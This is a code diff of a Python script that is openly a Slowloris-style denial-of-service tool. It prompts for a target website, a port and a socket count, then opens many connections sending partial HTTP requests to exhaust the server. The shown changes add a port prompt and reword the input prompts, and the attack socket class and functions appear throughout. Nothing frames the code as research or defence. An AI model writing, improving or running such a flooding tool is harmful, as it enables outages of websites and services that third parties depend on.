@@ -4,6 +4,11 @@ from time import sleep
 import os
 import time
 
+
+REGULAR_HEADERS = [
+    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
+    "Accept-language: en-US,en,q=0.5"
+]
 message = """
 88      dP"Yb  88""Yb 88 .dP"Y8 
 88     dP   Yb 88__dP 88 `Ybo." 
@@ -26,18 +31,14 @@ time.sleep(0.4)
 print "[=================   ] 85%"
 time.sleep(0.35)
 print "[====================] 100%"
-
-REGULAR_HEADERS = [
-    "User-agent: Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
-    "Accept-language: en-US,en,q=0.5"
-]
-
+print(message)
+IPT = input('Port> 80 or 443: ')
 class Sock(socket.socket):
     def __init__(self, target):
         try:
             super(Sock, self).__init__()
             self.settimeout(4)
-            self.connect((target, 443))
+            self.connect((target, IPT))
             self.send(("Get /?%s HTTP/1.1\r\n" % randint(0, 2000)).encode("UTF-8"))
             for header in REGULAR_HEADERS:
                 self.send(("%s\r\n" % header).encode("UTF-8"))
@@ -81,10 +82,9 @@ def make_sockets(max_sockets, target):
     return list_of_sockets
 
 def main():
-    print(message)
-    target = raw_input("EG> www.test.com or 1.1.1.1: ") # The target website for the attack
+    target = raw_input("Website or IP> www.test.com or 1.1.1.1: ") # The target website for the attack
     try:
-        max_sockets = input('Max sockets: ')
+        max_sockets = input('Max sockets> 500 to....: ')
         list_of_sockets = make_sockets(max_sockets, target)
         attack(list_of_sockets, max_sockets, target)
     except:
